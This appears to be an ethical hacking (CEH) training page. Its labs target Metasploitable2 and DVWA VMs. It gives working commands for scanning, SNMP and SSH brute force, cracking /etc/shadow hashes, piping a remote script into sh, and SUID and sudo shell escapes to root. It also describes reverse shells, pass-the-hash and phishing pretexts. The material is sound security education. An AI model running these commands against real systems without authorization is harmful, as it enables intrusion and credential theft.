CEH Phases & Ethics
The hacking methodology, legal framework, and pen test engagement model
Foundation

What Is Ethical Hacking?

Ethical hacking (penetration testing) is the authorized simulation of real-world attack techniques against a target system to discover vulnerabilities before malicious actors do. The key word is authorized — a written "Rules of Engagement" document signed by both parties is mandatory before any testing begins.

CEH (Certified Ethical Hacker) by EC-Council is the most recognized entry-level ethical hacking certification globally and in India. It covers a broad range of attack techniques across 20 modules, mapped to CEH's 5-phase methodology.

Phase 1
Reconnaissance
Passive + active information gathering about the target without direct interaction.
Phase 2
Scanning
Active probing — port scanning, OS detection, vulnerability discovery.
Phase 3
Enumeration
Extract detailed info — usernames, shares, services, OS version, banners.
Phase 4
Exploitation
Exploit identified vulnerabilities to gain unauthorized access to the system.
Phase 5
Post-Exploitation
Maintain access, escalate privileges, pivot, exfiltrate, cover tracks.

Types of Penetration Tests

Black Box: No prior knowledge of target. Most realistic — simulates an external attacker. Longest engagement; highest cost.

White Box: Full knowledge — source code, architecture docs, credentials. Most thorough; finds deepest vulnerabilities. Used for code reviews + internal audits.

Grey Box: Partial knowledge (network diagrams, some credentials). Balances realism with efficiency. Most common in commercial pen testing.

Red Team: Full adversarial simulation over weeks/months — physical access, social engineering, persistence. Tests detection and response capabilities, not just vulnerabilities.

Rules of Engagement
Written authorization specifying: scope (IPs, domains), excluded systems, testing hours, emergency contacts, data handling, legal liability. Required before any testing.
Scope Definition
Exactly which systems are in scope (IP ranges, domains, applications). Systems OUT of scope must never be touched — even if discovered during testing.
NDA & Confidentiality
Pen testers sign NDAs — findings cannot be disclosed externally. All sensitive data discovered during testing must be deleted after report delivery.
Hacker Types
Black hat — criminal. White hat — authorized ethical hacker. Grey hat — unauthorized but reports findings. Script kiddie — uses tools without understanding. Hacktivist — ideological motive.

Reconnaissance — OSINT & Footprinting
Passive and active information gathering before touching the target
Phase 1

Why Reconnaissance Matters Most

Real attackers spend 60–70% of their time in reconnaissance. The more you know about a target before attacking, the more surgical and effective the attack. Every piece of information gathered — employee names, email formats, technology stack, open ports from Shodan — reduces the attack surface you need to brute-force.

Passive recon leaves no trace on the target (WHOIS, Google, LinkedIn). Active recon directly interacts with the target (DNS queries, port scanning) and may show up in logs.

03
Scanning & Enumeration
Nmap mastery, service detection, OS fingerprinting, and SMB/SNMP enumeration
Phase 2–3

Scanning vs Enumeration

Scanning discovers live hosts, open ports, running services, and OS types. It answers: "What is up and what ports are open?" Enumeration extracts detailed information from running services — usernames, shares, groups, policies, application versions, routing information. It answers: "What exactly is running, and what can I learn from it?"

🗺️ Lab 3.1 — Nmap Full Reconnaissance (Host Discovery → Service Fingerprint) Nmap ▶
⚠Run against Metasploitable2 VM on your local host-only network (e.g., 192.168.56.101). Never scan external IPs without authorization.
  1. 1
    Step 1 — Host Discovery (Is the Target Up?)
    # Ping sweep — find all live hosts in subnet nmap -sn 192.168.56.0/24 # -sn: no port scan, just host discovery # Specific target — confirm it's up nmap -sn 192.168.56.101 # Host is up (0.00045s latency).
  2. 2
    Step 2 — TCP SYN Scan (Stealth Scan)
    # SYN scan — most common, faster, less noisy (sends SYN, doesn't complete handshake) nmap -sS 192.168.56.101 # Requires root/sudo # Scan specific port ranges nmap -sS -p 1-65535 192.168.56.101 # all ports nmap -sS -p 22,80,443,3306 192.168.56.101 # specific nmap -sS --top-ports 1000 192.168.56.101 # top 1000
  3. 3
    Step 3 — Service & Version Detection
    # -sV: probe open ports to determine service/version nmap -sV 192.168.56.101 # 21/tcp open ftp vsftpd 2.3.4 ← KNOWN VULNERABLE # 22/tcp open ssh OpenSSH 4.7p1 # 80/tcp open http Apache httpd 2.2.8 # 139/tcp open netbios-ssn Samba smbd 3.X # 3306/tcp open mysql MySQL 5.0.51a # 5900/tcp open vnc VNC protocol 3.3
  4. 4
    Step 4 — OS Fingerprinting
    # -O: OS detection (requires root) nmap -O 192.168.56.101 # OS: Linux 2.6.X # OS details: Linux 2.6.9 - 2.6.33 # Aggressive scan — all in one (OS + version + scripts + traceroute) nmap -A 192.168.56.101 -oN scan-results.txt
  5. 5
    Step 5 — NSE Scripts for Vulnerability Detection
    # Run default NSE scripts nmap -sC 192.168.56.101 # Specific vulnerability scripts nmap --script vuln 192.168.56.101 # run all vuln scripts nmap --script ftp-vsftpd-backdoor 192.168.56.101 # vsftpd 2.3.4 nmap --script smb-vuln-ms17-010 192.168.56.101 # EternalBlue nmap --script http-sql-injection 192.168.56.101 # SQL injection nmap --script ssh-brute --script-args passdb=/usr/share/wordlists/rockyou.txt 192.168.56.101
  6. 6
    Step 6 — SMB Enumeration with Enum4Linux
    # Enumerate SMB shares, users, groups, OS info enum4linux -a 192.168.56.101 # -a: do all simple enumeration # Output: OS version, workgroup, share list, users, groups, password policy # Targeted SMB user enumeration enum4linux -U 192.168.56.101 # users only enum4linux -S 192.168.56.101 # shares only # List SMB shares with no credentials smbclient -L //192.168.56.101 -N # -N: no password (null session)
  7. 7
    Step 7 — SNMP Enumeration
    # SNMP community string brute force onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.56.101 # Common community strings: public, private, manager, community # SNMP walk — dump all OIDs (huge amount of info) snmpwalk -c public -v1 192.168.56.101 # Reveals: running processes, installed packages, users, network interfaces
04
System Hacking
Exploiting known vulnerabilities to gain initial system access
Phase 4

The Exploitation Phase

Exploitation uses identified vulnerabilities from the scanning phase to gain unauthorized access. A real penetration tester always checks whether a vulnerability is exploitable in context before exploiting it — a CVSS 9.8 vulnerability in a firewalled internal service may be less critical than a CVSS 6.5 in a public-facing login page.

For CEH, the focus is on understanding how common exploit classes work — buffer overflows, command injection, misconfigured services — not on writing custom exploits from scratch.

Password Attacks
Hash cracking, brute force, credential stuffing, and password spraying
Credential

Password Attack Types

Brute force: Try every possible combination — slow but exhaustive. Effective against short/simple passwords.

Dictionary attack: Use a wordlist of common passwords (rockyou.txt has 14 million). Fastest for weak passwords.

Rule-based: Apply mutations to wordlist — capitalize first letter, add numbers at end, substitute o→0, a→@. Mimics how users create "complex" passwords.

Rainbow tables: Precomputed hash→password lookups. Fast but defeated by salting.

Credential stuffing: Use leaked username:password pairs from breaches against other services. Works because people reuse passwords.

Password spraying: Try one common password against many accounts. Avoids account lockout that brute force triggers.

🔑 Lab 5.1 — Hash Cracking with Hashcat and John the Ripper Password Lab ▶
  1. 1
    Identify Hash Type
    # Use hash-identifier or hashcat --help hash-identifier # Paste the hash and it tells you the type # Common hash examples: # MD5: d8578edf8458ce06fbc5bb76a58c5ca4 (32 chars) # SHA1: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 (40 chars) # SHA256: 65e84be33532fb784c48129675f9eff3a682b27168... (64 chars) # NTLM: 8846F7EAEE8FB117AD06BDD830B7586C (32 chars, Windows) # bcrypt: $2a$10$... (60 chars, starts with $2a$ or $2b$)
  2. 2
    Crack MD5 Hash with Hashcat (GPU-accelerated)
    # Create a file with the hash to crack echo "d8578edf8458ce06fbc5bb76a58c5ca4" > hash.txt # Straight dictionary attack hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt # -m 0: MD5 | -m 1000: NTLM | -m 1800: SHA-512 | -m 3200: bcrypt # Rule-based attack (best-64.rule mutates the wordlist) hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt \ -r /usr/share/hashcat/rules/best64.rule # Brute force all 6-char passwords hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a # ?a = all printable chars, ?d = digits, ?l = lowercase, ?u = uppercase
  3. 3
    Crack with John the Ripper
    # Auto-detect hash type and crack john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt # Crack a /etc/shadow file (Linux passwords) unshadow /etc/passwd /etc/shadow > combined.txt john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt # Show cracked passwords john --show hash.txt
  4. 4
    Brute Force SSH Login with Hydra
    # Brute force SSH (against Metasploitable2 only) hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \ -t 4 -V ssh://192.168.56.101 # -l: username | -P: password list | -t: threads | -V: verbose # Brute force HTTP POST login (e.g., DVWA) hydra -l admin -P /usr/share/wordlists/rockyou.txt \ 192.168.56.102 http-post-form \ "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed" # Format: URL:POST_params:Failed_string

Metasploit Framework
msfconsole, payloads, Meterpreter sessions, and post-exploitation modules
Core Tool

Metasploit Architecture

Metasploit is the world's most used penetration testing framework. It contains 2,000+ exploits, 1,000+ payloads, and 400+ auxiliary modules. Understanding its architecture is essential for both using it and explaining how it works in interviews.

Components: Exploit = the attack code. Payload = code that runs after exploitation (your shell). Auxiliary = scanners, fuzzers, tools (no payload). Post = post-exploitation modules. Encoder = evades AV by encoding payload. Nop = no-operation sled for buffer overflows.

Single Payload
Self-contained — all code in one. windows/shell_reverse_tcp. Limited features, smaller size. Good for constrained environments.
Staged Payload
Two-part: small stager sends first, then downloads second stage (Meterpreter). windows/meterpreter/reverse_tcp. More features, requires more network access.
Meterpreter
Advanced payload running in memory — no file on disk. Encrypted communications. Supports: file upload/download, screenshot, keylogger, pivot, hashdump, shell.
Reverse Shell
Target connects BACK to attacker. Bypasses firewall (outbound usually allowed). Most common payload type. Attacker sets up listener first.
Bind Shell
Payload opens a listening port on target. Attacker connects TO target. Blocked by inbound firewall rules. Less common in external engagements.
msfvenom
Standalone payload generator. Creates malicious files (exe, pdf, apk, python, etc.) with embedded shellcode. Used when Metasploit module doesn't exist for delivery.

Web Application Hacking
OWASP Top 10, SQL injection, XSS, Burp Suite workflow, and API testing
OWASP

Web App Attacks Are #1 Attack Vector

Web applications are the primary attack surface for external adversaries — they're public-facing, complex, and often contain business logic flaws alongside technical vulnerabilities. The OWASP Top 10 is the definitive reference for web application security risks and is heavily tested in CEH v13.

  • A01
    Broken Access Control
    Users can access resources or perform actions beyond their permissions. IDOR (Insecure Direct Object Reference), privilege escalation, forced browsing to admin pages.
    Lab: DVWA File Inclusion
  • A02
    Cryptographic Failures
    Sensitive data exposed due to weak/absent encryption. HTTP instead of HTTPS, MD5 hashed passwords without salt, sensitive data in URLs, weak TLS cipher suites.
    Lab: Inspect HTTP traffic in Wireshark
  • A03
    Injection (SQL, Command, LDAP)
    Untrusted data sent to an interpreter. SQL injection most common — attacker manipulates database queries. Command injection runs OS commands. LDAP injection bypasses auth.
    Lab: SQLi on DVWA / sqlmap
  • A07
    Cross-Site Scripting (XSS)
    Attacker injects malicious scripts into web pages viewed by others. Reflected (non-persistent), Stored (persistent in DB), DOM-based (client-side manipulation). Used for cookie theft, session hijacking.
    Lab: Stored XSS on DVWA
  • A05
    Security Misconfiguration
    Default credentials, directory listing enabled, error messages exposing stack traces, cloud storage publicly accessible, unnecessary services enabled.
    Lab: Directory traversal, default creds
  • A08
    Software & Data Integrity Failures
    Insecure deserialization, unsigned code updates, CI/CD pipeline with unverified dependencies. Allows remote code execution through deserializing attacker-controlled objects.
    CEH Theory — understand concept

Privilege Escalation
Linux SUID/sudo abuse, Windows token impersonation, and service misconfigurations
Post-Access

Why Privilege Escalation Is Critical

Initial access rarely gives you admin/root. Privilege escalation (privesc) takes you from a low-privileged account to SYSTEM/root. This is essential for: dumping password hashes, installing persistence mechanisms, accessing all files, and pivoting to other systems.

⬆️ Lab 8.1 — Linux Privilege Escalation Techniques Linux PrivEsc ▶
  1. 1
    Run LinPEAS — Automated Linux Privilege Escalation Scanner
    # Download LinPEAS to target (after initial access) curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Alternatively: wget from your attacker machine's HTTP server # LinPEAS highlights in RED: high probability privesc vectors # Key findings to look for: # - SUID binaries (especially non-standard ones) # - Writable /etc/passwd or /etc/sudoers # - Sudo rules without password (NOPASSWD) # - Cron jobs running as root with writable scripts # - Kernel version (old = possible kernel exploit)
  2. 2
    SUID Binary Abuse — GTFOBins
    # Find all SUID binaries find / -perm -4000 -type f 2>/dev/null # -perm -4000: has SUID bit set # SUID = runs as file OWNER (often root) regardless of who executes it # Example: nmap with SUID (old versions allow --interactive shell) ls -la /usr/bin/nmap # -rwsr-xr-x 1 root root ... /usr/bin/nmap ← SUID set (s in owner perms) nmap --interactive # nmap> nmap> !sh # drop to shell as root! # Check GTFOBins (gtfobins.github.io) for every SUID binary found # Common exploitable SUIDs: vim, python, find, bash, cp, nano # Example: find with SUID find . -exec /bin/sh -p \; -quit
  3. 3
    Sudo Misconfiguration
    # Check what the current user can sudo sudo -l # (root) NOPASSWD: /usr/bin/vim ← can run vim as root without password! # Exploit: vim can spawn a shell sudo vim -c ':!/bin/bash' # root@target:~# ← got root! # NOPASSWD with ALL: trivially sudo su # (root) NOPASSWD: ALL sudo su

Lateral Movement
Pass-the-Hash, Pass-the-Ticket, pivoting, and network spread techniques
Network

Lateral Movement — Expanding Foothold

After compromising one system, attackers move laterally through the network to reach higher-value targets — domain controllers, file servers, databases. Lateral movement uses legitimate protocols and credentials (SMB, RDP, WMI, SSH) making it hard to detect without behavioral analytics.

Two critical Windows credential attack techniques: Pass-the-Hash (PtH) — use a dumped NTLM hash directly without knowing the plaintext password. Pass-the-Ticket (PtT) — forge or steal Kerberos tickets (Golden/Silver Ticket attacks).

Step 1
Initial Access
Compromise workstation via phishing/exploit
Step 2
Credential Dump
Mimikatz / hashdump — extract NTLM hashes
Step 3
Pass the Hash
Use hash to authenticate to other SMB hosts
Step 4
Pivot
Route traffic through compromised host to reach internal segments
Step 5
Domain Control
Reach and compromise Domain Controller

Social Engineering
Phishing, pretexting, GoPhish campaigns, and vishing techniques
Human Attack

Social Engineering — The Human Vulnerability

Technical controls can be near-perfect — but humans remain the most exploitable attack surface. Social engineering manipulates people into performing actions or revealing information that compromises security. Over 90% of cyberattacks start with a phishing email. CEH dedicates an entire module to these techniques because they're the most effective initial access vector in real engagements.

Phishing
Mass email campaign impersonating trusted entity (bank, IT support, HR). Goal: credential harvest or malware delivery. Low specificity = lower success rate.
Spear Phishing
Highly targeted phishing using OSINT about the victim (name, role, manager, recent project). 3× more effective than generic phishing. Used in APT initial access.
Whaling
Spear phishing targeting C-suite executives. High-value target; attack often involves fake board meeting notifications, regulatory notices, or merger/acquisition documents.
Vishing
Voice phishing — phone calls impersonating IT helpdesk, bank fraud team, or CERT-In. Goal: get victim to reveal password, install remote access tool, or transfer money (BEC).
Pretexting
Creating a fabricated scenario (pretext) to extract information. "Hi, I'm from IT security — I need your current password to migrate your account to our new system."
Baiting
Leaving a USB drive labeled "Salary_2024.xlsx" in a parking lot or office. 45–98% of found drives are plugged in (IBM study). Autoruns or HID attacks execute payload.

AV Evasion — Why It Matters for CEH

Modern antivirus and EDR solutions detect payloads using three methods: signature-based (hash/pattern matching), heuristic (behavioral patterns), and behavioral (runtime monitoring). CEH tests your understanding of these techniques — and defenders must know them to build better detection rules.
